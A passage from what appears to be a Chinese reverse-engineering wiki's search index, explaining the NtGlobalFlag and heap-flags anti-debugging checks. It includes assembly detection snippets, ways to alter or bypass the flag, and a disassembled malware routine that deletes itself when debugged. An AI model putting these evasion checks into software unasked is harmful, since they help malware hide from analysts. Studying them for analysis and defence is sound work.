\nal\n,\n \n70\nh\n\n\nje\n \nbeing_debugged\n\n\n\n\n\n\u8981\u6ce8\u610f\u7684\u662f, \u5982\u679c\u662f\u4e00\u4e2a32\u4f4d\u7a0b\u5e8f\u572864\u4f4d\u673a\u5668\u4e0a\u8fd0\u884c, \u90a3\u4e48\u5b9e\u9645\u4e0a\u4f1a\u5b58\u5728\u4e24\u4e2aPEB: \u4e00\u4e2a\u662f32\u4f4d\u90e8\u5206\u7684\u800c\u53e6\u4e00\u4e2a\u662f64\u4f4d. 64\u4f4d\u7684PEB\u7684\u5bf9\u5e94\u5b57\u6bb5\u4e5f\u4f1a\u50cf\u572832\u4f4d\u7684\u90a3\u6837\u800c\u6539\u53d8.\n\n\n\u4e8e\u662f\u6211\u4eec\u5c31\u8fd8\u6709\u4ee5\u4e0b\u7684, \u752832\u4f4d\u7684\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u673a\u5668\u73af\u5883:\n\n\nmov eax, fs:[30h] ; Process Environment Block\n;64-bit Process Environment Block\n;follows 32-bit Process Environment Block\nmov al, [eax+10bch] ;NtGlobalFlag\nand al, 70h\ncmp al, 70h\nje being_debugged\n\n\n\n\n\u5207\u8bb0\u4e0d\u8981\u5728\u6ca1\u6709\u63a9\u76d6\u5176\u4ed6\u4f4d\u7684\u60c5\u51b5\u4e0b\u76f4\u63a5\u8fdb\u884c\u6bd4\u8f83, \u90a3\u6837\u4f1a\u65e0\u6cd5\u68c0\u6d4b\u5230\u8c03\u8bd5\u5668.\n\n\n\u5728\nExeCryptor\n\u5c31\u6709\u4f7f\u7528\nNtGlobalFlag\n\u6765\u68c0\u6d4b\u8c03\u8bd5\u5668, \u4e0d\u8fc7\nNtGlobalFlag\n\u7684\u90a33\u4e2a\u6807\u5fd7\u4f4d\u53ea\u6709\u5f53\u7a0b\u5e8f\u662f\n\u7531\u8c03\u8bd5\u5668\u521b\u5efa\n, \u800c\u975e\n\u7531\u8c03\u8bd5\u5668\u9644\u52a0\n\u4e0a\u53bb\u7684\u8fdb\u7a0b\u65f6, \u624d\u4f1a\u88ab\u8bbe\u7f6e. \n\n\n\u6539\u53d8NtGlobalFlag\u521d\u503c\n\n\n\u5f53\u7136\u7ed5\u8fc7\u8fd9\u79cd\u68c0\u6d4b\u7684\u65b9\u6cd5\u4e5f\u5341\u5206\u7b80\u5355, \u90a3\u5c31\u662f\u8c03\u8bd5\u5668\u60f3\u529e\u6cd5\u5c06\u8be5\u5b57\u6bb5\u91cd\u65b0\u8bbe\u7f6e\u4e3a0. \u7136\u800c\u8fd9\u4e2a\u9ed8\u8ba4\u7684\u521d\u503c\u53ef\u4ee5\u7528\u4ee5\u4e0b\u56db\u79cd\u65b9\u6cd5\u4efb\u610f\u4e00\u79cd\u6539\u53d8:\n\n\n\n\n\n\n\u6ce8\u518c\u8868\nHKLM\\System\\CurrentControlSet\\Control\\SessionManager\n\u7684\nGlobalFlag\n\u7684\u503c\u4f1a\u66ff\u6362\u8fdb\u884c\nNtGlobalFlag\n\u5b57\u6bb5. \u5c3d\u7ba1\u5b83\u968f\u540e\u8fd8\u53ef\u80fd\u7531Windows\u6539\u53d8(\u4ee5\u4e0b\u4f1a\u4ecb\u7ecd), \u6ce8\u518c\u8868\u952e\u503c\u4f1a\u5bf9\u7cfb\u7edf\u4e2d\u6240\u6709\u8fdb\u7a0b\u4ea7\u751f\u5f71\u54cd\u5e76\u5728\u91cd\u542f\u540e\u751f\u6548.\n\n\n\n\n\u5f53\u7136\u8fd9\u4e5f\u4ea7\u751f\u4e86\u53e6\u4e00\u79cd\u68c0\u6d4b\u8c03\u8bd5\u5668\u7684\u65b9\u6cd5: \u5982\u679c\u4e00\u4e2a\u8c03\u8bd5\u5668\u4e3a\u4e86\u9690\u85cf\u81ea\u5df1, \u800c\u5c06\u6ce8\u518c\u8868\u4e2d\u7684\u952e\u503c\u590d\u5236\u5230\nNtGlobalFlag\n\u5b57\u6bb5\u4e2d, \u7136\u800c\u6ce8\u518c\u8868\u4e2d\u7684\u952e\u503c\u4e8b\u5148\u5df2\u7ecf\u66ff\u6362\u5e76\u4e14\u5c1a\u672a\u91cd\u542f\u751f\u6548. \u90a3\u4e48\u8c03\u8bd5\u5668\u53ea\u662f\u590d\u5236\u4e86\u4e00\u4e2a\u5047\u7684\u503c, \u800c\u975e\u771f\u6b63\u9700\u8981\u7684\u90a3\u4e2a. \u5982\u679c\u7a0b\u5e8f\u77e5\u9053\u771f\u6b63\u7684\u503c\u800c\u975e\u6ce8\u518c\u8868\u4e2d\u7684\u90a3\u4e2a\u5047\u7684\u503c, \u90a3\u4e48\u5c31\u53ef\u4ee5\u5bdf\u89c9\u5230\u8c03\u8bd5\u5668\u7684\u5b58\u5728.\n\n\n\u5f53\u7136\u8c03\u8bd5\u5668\u4e5f\u53ef\u4ee5\u8fd0\u884c\u5176\u4ed6\u8fdb\u7a0b\u7136\u540e\u67e5\u8be2\nNtGlobalFlag\n\u5b57\u6bb5\u6765\u83b7\u53d6\u771f\u6b63\u7684\u503c.\n\n\n\n\n\n\n\u4f9d\u65e7\u662f\nGlobalFlag\n, \u4e0d\u8fc7\u8fd9\u91cc\u7684\u662f\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\nfilename\n. (\u6620\u50cf\u52ab\u6301), \u8fd9\u91cc\u9700\u8981\u5c06\nfilename\n\u66ff\u6362\u4e3a\u9700\u8981\u66f4\u6539\u7684\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6587\u4ef6\u540d(\u4e0d\u9700\u8981\u6307\u5b9a\u8def\u5f84). \u8bbe\u7f6e\u597d\nGlobalFlag\n\u540e, \u7cfb\u7edf\u4f1a\u5c06\u5176\u503c\u8986\u76d6\u5230\nNtGlobalFlag\n\u5b57\u6bb5(\u53ea\u5355\u72ec\u4e3a\u6307\u5b9a\u7684\u8fdb\u7a0b\u8986\u76d6). \u4e0d\u8fc7\u4e5f\u8fd8\u662f\u53ef\u4ee5\u518d\u6b21\u7531Windows\u6539\u53d8(\u89c1\u4e0b).\n\n\n\n\n\n\n\u5728\u52a0\u8f7d\u914d\u7f6e\u8868(\nLoad Configuration Table\n)\u7684\u4e24\u4e2a\u5b57\u6bb5: \nGlobalFlagsClear\n\u548c\nGlobalFlagsSet\n. \n\n\nGlobalFlagsClear\n\u5217\u51fa\u9700\u8981\u6e05\u7a7a\u7684\u6807\u5fd7\u4f4d, \u800c\nGlobalFlagsSet\n\u5219\u5217\u51fa\u9700\u8981\u8bbe\u7f6e\u7684\u6807\u5fd7\u4f4d, \u8fd9\u4e9b\u8bbe\u7f6e\u4f1a\u5728\nGlobalFlag\n\u5e94\u7528\u4e4b\u540e\u518d\u751f\u6548, \u56e0\u6b64\u5b83\u53ef\u4ee5\u8986\u76d6\u6389\nGlobalFlag\n\u6307\u5b9a\u7684\u503c. \u7136\u800c\u5b83\u65e0\u6cd5\u8986\u76d6\u6389Windows\u6307\u5b9a\u8bbe\u7f6e\u7684\u6807\u5fd7\u4f4d. \u6bd4\u5982\u8bbe\u7f6e\nFLG_USER_STACK_TRACE_DB (0x1000)\n\u53ef\u4ee5\u8ba9Windows\u8bbe\u7f6e\nFLG_HEAP_VALIDATE_PARAMETERS (0x40)\n\u6807\u5fd7\u4f4d, \u5c31\u7b97\nFLG_HEAP_VALIDATE_PARAMETERS\n\u5728\u52a0\u8f7d\u914d\u7f6e\u8868(\nLoad Configuration Table\n)\u4e2d\u88ab\u6e05\u7a7a\u4e86, Windows\u4e5f\u4f1a\u5728\u968f\u540e\u7684\u8fdb\u7a0b\u52a0\u8f7d\u8fc7\u7a0b\u4e2d\u91cd\u65b0\u8bbe\u7f6e.\n\n\n\n\n\n\n\u5f53\u8c03\u8bd5\u5668\u521b\u5efa\u8fdb\u7a0b\u65f6, Windows\u4f1a\u505a\u51fa\u4e00\u4e9b\u6539\u53d8. \u901a\u8fc7\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u4e2d\u7684\n_NO_DEBUG_HEAP\n, \nNtGlobalFlag\n\u5c06\u4f1a\u56e0\u4e3a\u8c03\u8bd5\u5668\u800c\u4e0d\u4f1a\u8bbe\u7f6e\u5176\u4e2d\u76843\u4e2a\u5806\u7684\u6807\u5fd7\u4f4d. \u5f53\u7136\u5b83\u4eec\u4f9d\u65e7\u53ef\u4ee5\u901a\u8fc7\nGlobalFlag\n\u6216\u52a0\u8f7d\u914d\u7f6e\u8868\u4e2d\u7684\nGlobalFlagsSet\n\u7ee7\u7eed\u8bbe\u7f6e. \n\n\n\n\n\n\n\u5982\u4f55\u7ed5\u8fc7\u68c0\u6d4b?\n\n\n\u6709\u4ee5\u4e0b3\u79cd\u65b9\u6cd5\u6765\u7ed5\u8fc7\nNtGlobalFlag\n\u7684\u68c0\u6d4b\n\n\n\n\n\u624b\u52a8\u4fee\u6539\u6807\u5fd7\u4f4d\u7684\u503c(\nFLG_HEAP_ENABLE_TAIL_CHECK\n, \nFLG_HEAP_ENABLE_FREE_CHECK\n, \nFLG_HEAP_VALIDATE_PARAMETERS\n)\n\n\n\u5728Ollydbg\u4e2d\u4f7f\u7528\nhide-debug\n\u63d2\u4ef6 \n\n\n\u5728Windbg\u7981\u7528\u8c03\u8bd5\u5806\u7684\u65b9\u5f0f\u542f\u52a8\u7a0b\u5e8f(\nwindbg -hd program.exe\n)\n\n\n\n\n\u624b\u52a8\u7ed5\u8fc7\u793a\u4f8b\n\n\n\u4ee5\u4e0b\u662f\u4e00\u4e2a\u6f14\u793a\u5982\u4f55\u624b\u52a8\u7ed5\u8fc7\u68c0\u6d4b\u7684\u793a\u4f8b\n\n\n.text:\n00403594\n     \n64\n \nA1\n \n30\n \n00\n \n00\n \n00\n          \nmov\n     \neax\n,\n \nlarge\n \nfs\n:\n30\nh\n   \n; PEB struct loaded into EAX\n\n\n.text\n:\n0040359\nA\n                                \ndb\n      \n3\nEh\n                 \n; IDA Pro display error (the byte is actually used in the next instruction)\n\n\n.text\n:\n0040359\nA\n     \n3\nE\n \n8\nB\n \n40\n \n68\n                \nmov\n     \neax\n,\n \n[\neax\n+\n68\nh\n]\n      \n; NtGlobalFlag (offset 0x68 relative to PEB) saved to EAX\n\n\n.text\n:\n0040359\nE\n     \n83\n \nE8\n \n70\n                   \nsub\n     \neax\n,\n \n70\nh\n            \n; Value 0x70 corresponds to all flags on (FLG_HEAP_ENABLE_TAIL_CHECK, FLG_HEAP_ENABLE_FREE_CHECK, FLG_HEAP_VALIDATE_PARAMETERS)\n\n\n.text\n:\n004035\nA1\n     \n89\n \n85\n \nD8\n \nE7\n \nFF\n \nFF\n          \nmov\n     \n[\nebp\n+\nvar_1828\n],\n \neax\n\n\n.text:\n004035\nA7\n     \n83\n \nBD\n \nD8\n \nE7\n \nFF\n \nFF\n \n00\n       \ncmp\n     \n[\nebp\n+\nvar_1828\n],\n \n0\n   \n; Check whether 3 debug flags were on (result of substraction should be 0 if debugged)\n\n\n.text\n:\n004035\nAE\n     \n75\n \n05\n                      \njnz\n     \nshort\n \nloc_4035B5\n    \n; No debugger, program continues...\n\n\n.text\n:\n004035\nB0\n     \nE8\n \n4\nB\n \nDA\n \nFF\n \nFF\n             \ncall\n    \ns_selfDelete\n        \n; ...else, malware deleted\n\n\n\n\n\n\u5728Ollydbg\u4e2d\u5728\u504f\u79fb\n0x40359A\n\u8bbe\u7f6e\u65ad\u70b9, \u8fd0\u884c\u7a0b\u5e8f\u89e6\u53d1\u65ad\u70b9. \u7136\u540e\u6253\u5f00\nCommandLine\n\u63d2\u4ef6\u7528\ndump fs:[30]+0x68\ndump\u51fa\nNtGlobalFlag\n\u7684\u5185\u5bb9\n\n\n\n\n\u53f3\u952e\u9009\u62e9\nBinary-\nFill with 00's\n\u5c06\u503c\n0x70\n\u66ff\u6362\u4e3a\n0x00\n\u5373\u53ef.\n\n\n\u53c2\u8003\u94fe\u63a5\n\n\n\n\nThe \"Ultimate\" Anti-Debugging Reference\n\n\nPEB-Process-Environment-Block/NtGlobalFlag", 
            "title": "NtGlobalFlag"
        }, 
        {
            "location": "/reverse/anti-debug/ntglobalflag/#ntglobalflag", 
            "text": "\u572832\u4f4d\u673a\u5668\u4e0a,  NtGlobalFlag \u5b57\u6bb5\u4f4d\u4e8e PEB (\u8fdb\u7a0b\u73af\u5883\u5757) 0x68 \u7684\u504f\u79fb\u5904, 64\u4f4d\u673a\u5668\u5219\u662f\u5728\u504f\u79fb 0xBC \u4f4d\u7f6e. \u8be5\u5b57\u6bb5\u7684\u9ed8\u8ba4\u503c\u4e3a0. \u5f53\u8c03\u8bd5\u5668\u6b63\u5728\u8fd0\u884c\u65f6, \u8be5\u5b57\u6bb5\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u7279\u5b9a\u7684\u503c. \u5c3d\u7ba1\u8be5\u503c\u5e76\u4e0d\u80fd\u5341\u5206\u53ef\u4fe1\u5730\u8868\u660e\u67d0\u4e2a\u8c03\u8bd5\u5668\u771f\u7684\u6709\u5728\u8fd0\u884c, \u4f46\u8be5\u5b57\u6bb5\u5e38\u51fa\u4e8e\u8be5\u76ee\u7684\u800c\u88ab\u4f7f\u7528.   \u8be5\u5b57\u6bb5\u5305\u542b\u6709\u4e00\u7cfb\u5217\u7684\u6807\u5fd7\u4f4d. \u7531\u8c03\u8bd5\u5668\u521b\u5efa\u7684\u8fdb\u7a0b\u4f1a\u8bbe\u7f6e\u4ee5\u4e0b\u6807\u5fd7\u4f4d:  FLG_HEAP_ENABLE_TAIL_CHECK   ( 0x10 )  FLG_HEAP_ENABLE_FREE_CHECK   ( 0x20 )  FLG_HEAP_VALIDATE_PARAMETERS   ( 0x40 )", 
            "title": "\u5173\u4e8eNtGlobalFlag"
        }, 
        {
            "location": "/reverse/anti-debug/ntglobalflag/#_1", 
            "text": "\u56e0\u6b64, \u53ef\u4ee5\u68c0\u67e5\u8fd9\u51e0\u4e2a\u6807\u5fd7\u4f4d\u6765\u68c0\u6d4b\u8c03\u8bd5\u5668\u662f\u5426\u5b58\u5728. \u6bd4\u5982\u7528\u5f62\u5982\u4ee5\u4e0b\u768432\u4f4d\u7684\u4ee3\u7801\u572832\u4f4d\u673a\u5668\u4e0a\u8fdb\u884c\u68c0\u6d4b:  mov   eax ,   fs :[ 30 h ]   ;Process Environment Block  mov   al ,   [ eax + 68 h ]   ;NtGlobalFlag  and   al ,   70 h  cmp   al ,   70 h  je   being_debugged   \u4ee5\u4e0b\u662f64\u4f4d\u7684\u4ee3\u7801\u572864\u4f4d\u673a\u5668\u4e0a\u7684\u68c0\u6d4b\u4ee3\u7801:  push   60 h  pop   rsi  gs: lodsq                  ;Process Environment Block  mov   al ,   [ rsi * 2 + rax-14h ]   ;NtGlobalFlag  and   al ,   70 h  cmp   al ,   70 h  je   being_debugged   \u8981\u6ce8\u610f\u7684\u662f, \u5982\u679c\u662f\u4e00\u4e2a32\u4f4d\u7a0b\u5e8f\u572864\u4f4d\u673a\u5668\u4e0a\u8fd0\u884c, \u90a3\u4e48\u5b9e\u9645\u4e0a\u4f1a\u5b58\u5728\u4e24\u4e2aPEB: \u4e00\u4e2a\u662f32\u4f4d\u90e8\u5206\u7684\u800c\u53e6\u4e00\u4e2a\u662f64\u4f4d. 64\u4f4d\u7684PEB\u7684\u5bf9\u5e94\u5b57\u6bb5\u4e5f\u4f1a\u50cf\u572832\u4f4d\u7684\u90a3\u6837\u800c\u6539\u53d8.  \u4e8e\u662f\u6211\u4eec\u5c31\u8fd8\u6709\u4ee5\u4e0b\u7684, \u752832\u4f4d\u7684\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u673a\u5668\u73af\u5883:  mov eax, fs:[30h] ; Process Environment Block\n;64-bit Process Environment Block\n;follows 32-bit Process Environment Block\nmov al, [eax+10bch] ;NtGlobalFlag\nand al, 70h\ncmp al, 70h\nje being_debugged  \u5207\u8bb0\u4e0d\u8981\u5728\u6ca1\u6709\u63a9\u76d6\u5176\u4ed6\u4f4d\u7684\u60c5\u51b5\u4e0b\u76f4\u63a5\u8fdb\u884c\u6bd4\u8f83, \u90a3\u6837\u4f1a\u65e0\u6cd5\u68c0\u6d4b\u5230\u8c03\u8bd5\u5668.  \u5728 ExeCryptor \u5c31\u6709\u4f7f\u7528 NtGlobalFlag \u6765\u68c0\u6d4b\u8c03\u8bd5\u5668, \u4e0d\u8fc7 NtGlobalFlag \u7684\u90a33\u4e2a\u6807\u5fd7\u4f4d\u53ea\u6709\u5f53\u7a0b\u5e8f\u662f \u7531\u8c03\u8bd5\u5668\u521b\u5efa , \u800c\u975e \u7531\u8c03\u8bd5\u5668\u9644\u52a0 \u4e0a\u53bb\u7684\u8fdb\u7a0b\u65f6, \u624d\u4f1a\u88ab\u8bbe\u7f6e.", 
            "title": "\u68c0\u6d4b\u4ee3\u7801"
        }, 
        {
            "location": "/reverse/anti-debug/ntglobalflag/#ntglobalflag_1", 
            "text": "\u5f53\u7136\u7ed5\u8fc7\u8fd9\u79cd\u68c0\u6d4b\u7684\u65b9\u6cd5\u4e5f\u5341\u5206\u7b80\u5355, \u90a3\u5c31\u662f\u8c03\u8bd5\u5668\u60f3\u529e\u6cd5\u5c06\u8be5\u5b57\u6bb5\u91cd\u65b0\u8bbe\u7f6e\u4e3a0. \u7136\u800c\u8fd9\u4e2a\u9ed8\u8ba4\u7684\u521d\u503c\u53ef\u4ee5\u7528\u4ee5\u4e0b\u56db\u79cd\u65b9\u6cd5\u4efb\u610f\u4e00\u79cd\u6539\u53d8:    \u6ce8\u518c\u8868 HKLM\\System\\CurrentControlSet\\Control\\SessionManager \u7684 GlobalFlag \u7684\u503c\u4f1a\u66ff\u6362\u8fdb\u884c NtGlobalFlag \u5b57\u6bb5. \u5c3d\u7ba1\u5b83\u968f\u540e\u8fd8\u53ef\u80fd\u7531Windows\u6539\u53d8(\u4ee5\u4e0b\u4f1a\u4ecb\u7ecd), \u6ce8\u518c\u8868\u952e\u503c\u4f1a\u5bf9\u7cfb\u7edf\u4e2d\u6240\u6709\u8fdb\u7a0b\u4ea7\u751f\u5f71\u54cd\u5e76\u5728\u91cd\u542f\u540e\u751f\u6548.   \u5f53\u7136\u8fd9\u4e5f\u4ea7\u751f\u4e86\u53e6\u4e00\u79cd\u68c0\u6d4b\u8c03\u8bd5\u5668\u7684\u65b9\u6cd5: \u5982\u679c\u4e00\u4e2a\u8c03\u8bd5\u5668\u4e3a\u4e86\u9690\u85cf\u81ea\u5df1, \u800c\u5c06\u6ce8\u518c\u8868\u4e2d\u7684\u952e\u503c\u590d\u5236\u5230 NtGlobalFlag \u5b57\u6bb5\u4e2d, \u7136\u800c\u6ce8\u518c\u8868\u4e2d\u7684\u952e\u503c\u4e8b\u5148\u5df2\u7ecf\u66ff\u6362\u5e76\u4e14\u5c1a\u672a\u91cd\u542f\u751f\u6548. \u90a3\u4e48\u8c03\u8bd5\u5668\u53ea\u662f\u590d\u5236\u4e86\u4e00\u4e2a\u5047\u7684\u503c, \u800c\u975e\u771f\u6b63\u9700\u8981\u7684\u90a3\u4e2a. \u5982\u679c\u7a0b\u5e8f\u77e5\u9053\u771f\u6b63\u7684\u503c\u800c\u975e\u6ce8\u518c\u8868\u4e2d\u7684\u90a3\u4e2a\u5047\u7684\u503c, \u90a3\u4e48\u5c31\u53ef\u4ee5\u5bdf\u89c9\u5230\u8c03\u8bd5\u5668\u7684\u5b58\u5728.  \u5f53\u7136\u8c03\u8bd5\u5668\u4e5f\u53ef\u4ee5\u8fd0\u884c\u5176\u4ed6\u8fdb\u7a0b\u7136\u540e\u67e5\u8be2 NtGlobalFlag \u5b57\u6bb5\u6765\u83b7\u53d6\u771f\u6b63\u7684\u503c.    \u4f9d\u65e7\u662f GlobalFlag , \u4e0d\u8fc7\u8fd9\u91cc\u7684\u662f HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ filename . (\u6620\u50cf\u52ab\u6301), \u8fd9\u91cc\u9700\u8981\u5c06 filename \u66ff\u6362\u4e3a\u9700\u8981\u66f4\u6539\u7684\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6587\u4ef6\u540d(\u4e0d\u9700\u8981\u6307\u5b9a\u8def\u5f84). \u8bbe\u7f6e\u597d GlobalFlag \u540e, \u7cfb\u7edf\u4f1a\u5c06\u5176\u503c\u8986\u76d6\u5230 NtGlobalFlag \u5b57\u6bb5(\u53ea\u5355\u72ec\u4e3a\u6307\u5b9a\u7684\u8fdb\u7a0b\u8986\u76d6). \u4e0d\u8fc7\u4e5f\u8fd8\u662f\u53ef\u4ee5\u518d\u6b21\u7531Windows\u6539\u53d8(\u89c1\u4e0b).    \u5728\u52a0\u8f7d\u914d\u7f6e\u8868( Load Configuration Table )\u7684\u4e24\u4e2a\u5b57\u6bb5:  GlobalFlagsClear \u548c GlobalFlagsSet .   GlobalFlagsClear \u5217\u51fa\u9700\u8981\u6e05\u7a7a\u7684\u6807\u5fd7\u4f4d, \u800c GlobalFlagsSet \u5219\u5217\u51fa\u9700\u8981\u8bbe\u7f6e\u7684\u6807\u5fd7\u4f4d, \u8fd9\u4e9b\u8bbe\u7f6e\u4f1a\u5728 GlobalFlag \u5e94\u7528\u4e4b\u540e\u518d\u751f\u6548, \u56e0\u6b64\u5b83\u53ef\u4ee5\u8986\u76d6\u6389 GlobalFlag \u6307\u5b9a\u7684\u503c. \u7136\u800c\u5b83\u65e0\u6cd5\u8986\u76d6\u6389Windows\u6307\u5b9a\u8bbe\u7f6e\u7684\u6807\u5fd7\u4f4d. \u6bd4\u5982\u8bbe\u7f6e FLG_USER_STACK_TRACE_DB (0x1000) \u53ef\u4ee5\u8ba9Windows\u8bbe\u7f6e FLG_HEAP_VALIDATE_PARAMETERS (0x40) \u6807\u5fd7\u4f4d, \u5c31\u7b97 FLG_HEAP_VALIDATE_PARAMETERS \u5728\u52a0\u8f7d\u914d\u7f6e\u8868( Load Configuration Table )\u4e2d\u88ab\u6e05\u7a7a\u4e86, Windows\u4e5f\u4f1a\u5728\u968f\u540e\u7684\u8fdb\u7a0b\u52a0\u8f7d\u8fc7\u7a0b\u4e2d\u91cd\u65b0\u8bbe\u7f6e.    \u5f53\u8c03\u8bd5\u5668\u521b\u5efa\u8fdb\u7a0b\u65f6, Windows\u4f1a\u505a\u51fa\u4e00\u4e9b\u6539\u53d8. \u901a\u8fc7\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u4e2d\u7684 _NO_DEBUG_HEAP ,  NtGlobalFlag \u5c06\u4f1a\u56e0\u4e3a\u8c03\u8bd5\u5668\u800c\u4e0d\u4f1a\u8bbe\u7f6e\u5176\u4e2d\u76843\u4e2a\u5806\u7684\u6807\u5fd7\u4f4d. \u5f53\u7136\u5b83\u4eec\u4f9d\u65e7\u53ef\u4ee5\u901a\u8fc7 GlobalFlag \u6216\u52a0\u8f7d\u914d\u7f6e\u8868\u4e2d\u7684 GlobalFlagsSet \u7ee7\u7eed\u8bbe\u7f6e.", 
            "title": "\u6539\u53d8NtGlobalFlag\u521d\u503c"
        }, 
        {
            "location": "/reverse/anti-debug/ntglobalflag/#_2", 
            "text": "\u6709\u4ee5\u4e0b3\u79cd\u65b9\u6cd5\u6765\u7ed5\u8fc7 NtGlobalFlag \u7684\u68c0\u6d4b   \u624b\u52a8\u4fee\u6539\u6807\u5fd7\u4f4d\u7684\u503c( FLG_HEAP_ENABLE_TAIL_CHECK ,  FLG_HEAP_ENABLE_FREE_CHECK ,  FLG_HEAP_VALIDATE_PARAMETERS )  \u5728Ollydbg\u4e2d\u4f7f\u7528 hide-debug \u63d2\u4ef6   \u5728Windbg\u7981\u7528\u8c03\u8bd5\u5806\u7684\u65b9\u5f0f\u542f\u52a8\u7a0b\u5e8f( windbg -hd program.exe )", 
            "title": "\u5982\u4f55\u7ed5\u8fc7\u68c0\u6d4b?"
        }, 
        {
            "location": "/reverse/anti-debug/ntglobalflag/#_3", 
            "text": "\u4ee5\u4e0b\u662f\u4e00\u4e2a\u6f14\u793a\u5982\u4f55\u624b\u52a8\u7ed5\u8fc7\u68c0\u6d4b\u7684\u793a\u4f8b  .text: 00403594       64   A1   30   00   00   00            mov       eax ,   large   fs : 30 h     ; PEB struct loaded into EAX  .text : 0040359 A                                  db        3 Eh                   ; IDA Pro display error (the byte is actually used in the next instruction)  .text : 0040359 A       3 E   8 B   40   68                  mov       eax ,   [ eax + 68 h ]        ; NtGlobalFlag (offset 0x68 relative to PEB) saved to EAX  .text : 0040359 E       83   E8   70                     sub       eax ,   70 h              ; Value 0x70 corresponds to all flags on (FLG_HEAP_ENABLE_TAIL_CHECK, FLG_HEAP_ENABLE_FREE_CHECK, FLG_HEAP_VALIDATE_PARAMETERS)  .text : 004035 A1       89   85   D8   E7   FF   FF            mov       [ ebp + var_1828 ],   eax  .text: 004035 A7       83   BD   D8   E7   FF   FF   00         cmp       [ ebp + var_1828 ],   0     ; Check whether 3 debug flags were on (result of substraction should be 0 if debugged)  .text : 004035 AE       75   05                        jnz       short   loc_4035B5      ; No debugger, program continues...  .text : 004035 B0       E8   4 B   DA   FF   FF               call      s_selfDelete          ; ...else, malware deleted   \u5728Ollydbg\u4e2d\u5728\u504f\u79fb 0x40359A \u8bbe\u7f6e\u65ad\u70b9, \u8fd0\u884c\u7a0b\u5e8f\u89e6\u53d1\u65ad\u70b9. \u7136\u540e\u6253\u5f00 CommandLine \u63d2\u4ef6\u7528 dump fs:[30]+0x68 dump\u51fa NtGlobalFlag \u7684\u5185\u5bb9   \u53f3\u952e\u9009\u62e9 Binary- Fill with 00's \u5c06\u503c 0x70 \u66ff\u6362\u4e3a 0x00 \u5373\u53ef.", 
            "title": "\u624b\u52a8\u7ed5\u8fc7\u793a\u4f8b"
        }, 
        {
            "location": "/reverse/anti-debug/ntglobalflag/#_4", 
            "text": "The \"Ultimate\" Anti-Debugging Reference  PEB-Process-Environment-Block/NtGlobalFlag", 
            "title": "\u53c2\u8003\u94fe\u63a5"
        }, 
        {
            "location": "/reverse/anti-debug/heap-flags/", 
            "text": "\u5173\u4e8eHeap flags\n\n\nHeap flags\n\u5305\u542b\u6709\u4e24\u4e2a\u4e0e\nNtGlobalFlag\n\u4e00\u8d77\u521d\u59cb\u5316\u7684\u6807\u5fd7: \nFlags\n\u548c\nForceFlags\n. \u8fd9\u4e24\u4e2a\u5b57\u6bb5\u7684\u503c\u4e0d\u4ec5\u4f1a\u53d7\u8c03\u8bd5\u5668\u7684\u5f71\u54cd, \u8fd8\u4f1a\u7531windows\u7248\u672c\u800c\u4e0d\u540c, \u5b57\u6bb5\u7684\u4f4d\u7f6e\u4e5f\u53d6\u51b3\u4e8ewindows\u7684\u7248\u672c. \n\n\n\n\nFlags\u5b57\u6bb5:\n\n\n\u572832\u4f4dWindows NT, Windows 2000\u548cWindows XP\u4e2d, \nFlags\n\u4f4d\u4e8e\u5806\u7684\n0x0C\n\u504f\u79fb\u5904. \u572832\u4f4dWindows Vista\u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u4e2d, \u5b83\u4f4d\u4e8e\n0x40\n\u504f\u79fb\u5904. \n\n\n\u572864\u4f4dWindows XP\u4e2d, \nFlags\n\u5b57\u6bb5\u4f4d\u4e8e\u5806\u7684\n0x14\n\u504f\u79fb\u5904, \u800c\u572864\u4f4dWindows Vista\u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u4e2d, \u5b83\u5219\u662f\u4f4d\u4e8e\n0x70\n\u504f\u79fb\u5904.\n\n\n\n\n\n\nForceFlags\u5b57\u6bb5:\n\n\n\u572832\u4f4dWindows NT, Windows 2000\u548cWindows XP\u4e2d, \nForceFlags\n\u4f4d\u4e8e\u5806\u7684\n0x10\n\u504f\u79fb\u5904. \u572832\u4f4dWindows Vista\u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u4e2d, \u5b83\u4f4d\u4e8e\n0x44\n\u504f\u79fb\u5904. \n\n\n\u572864\u4f4dWindows XP\u4e2d, \nForceFlags\n\u5b57\u6bb5\u4f4d\u4e8e\u5806\u7684\n0x18\n\u504f\u79fb\u5904, \u800c\u572864\u4f4dWindows Vista\u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u4e2d, \u5b83\u5219\u662f\u4f4d\u4e8e\n0x74\n\u504f\u79fb\u5904.\n\n\n\n\n\n\n\n\n\u5728\u6240\u6709\u7248\u672c\u7684Windows\u4e2d, \nFlags\n\u5b57\u6bb5\u7684\u503c\u6b63\u5e38\u60c5\u51b5\u90fd\u8bbe\u4e3a\nHEAP_GROWABLE(2)\n, \u800c\nForceFlags\n\u5b57\u6bb5\u6b63\u5e38\u60c5\u51b5\u90fd\u8bbe\u4e3a\n0\n. \u7136\u800c\u5bf9\u4e8e\u4e00\u4e2a32\u4f4d\u8fdb\u7a0b(64\u4f4d\u7a0b\u5e8f\u4e0d\u4f1a\u6709\u6b64\u56f0\u6270), \u8fd9\u4e24\u4e2a\u9ed8\u8ba4\u503c, \u90fd\u53d6\u51b3\u4e8e\u5b83\u7684\u5bbf\u4e3b\u8fdb\u7a0b(host process)\u7684\nsubsystem\n\u7248\u672c(\u8fd9\u91cc\u4e0d\u662f\u6307\u6240\u8bf4\u7684\u6bd4\u5982win10\u7684linux\u5b50\u7cfb\u7edf). \u53ea\u6709\u5f53\nsubsystem\n\u5728\n3.51\n\u53ca\u66f4\u9ad8\u7684\u7248\u672c, \u5b57\u6bb5\u7684\u9ed8\u8ba4\u503c\u624d\u5982\u524d\u6240\u8ff0. \u5982\u679c\u662f\u5728\n3.10-3.50\n\u7248\u672c\u4e4b\u95f4, \u5219\u4e24\u4e2a\u5b57\u6bb5\u7684\nHEAP_CREATE_ALIGN_16 